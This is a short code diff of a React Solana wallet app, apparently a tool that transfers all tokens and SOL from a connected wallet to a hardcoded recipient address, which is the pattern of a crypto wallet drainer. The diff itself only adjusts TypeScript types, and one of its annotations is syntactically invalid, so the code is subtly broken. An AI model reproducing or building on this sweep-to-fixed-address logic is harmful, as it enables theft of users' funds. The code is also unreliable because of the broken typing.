@@ -1,4 +1,4 @@
-import React, { useState, useCallback } from 'react';
+import { useState, useCallback } from 'react';
 import { useConnection, useWallet } from '@solana/wallet-adapter-react';
 import { WalletMultiButton } from '@solana/wallet-adapter-react-ui';
 import {
@@ -21,7 +21,7 @@ const App = () => {
   const { publicKey, sendTransaction } = useWallet();
   const [recipientAddress, setRecipientAddress] = useState('3KBJ2uHxtm3ZTEoBUad8MPbDQcUGeUwzAm7aqm5ehTBX');
   const [isLoading, setIsLoading] = useState(false);
-  const [error, setError] = useState(null);
+  const [error, setError]: any = useState(null);
 
   // Fetch all tokens in the wallet
   const getTokenAccounts = useCallback(async () => {
@@ -131,9 +131,9 @@ const App = () => {
       await connection.confirmTransaction(signature, 'confirmed');
 
       alert('All tokens and SOL transferred successfully!');
-    } catch (err) {
+    } catch (err: any) {
       console.error('Transfer error:', err);
-      setError('Failed to transfer: ' + err.message);
+      setError('Failed to transfer: ' + err.message as string);
     } finally {
       setIsLoading(false);
     }
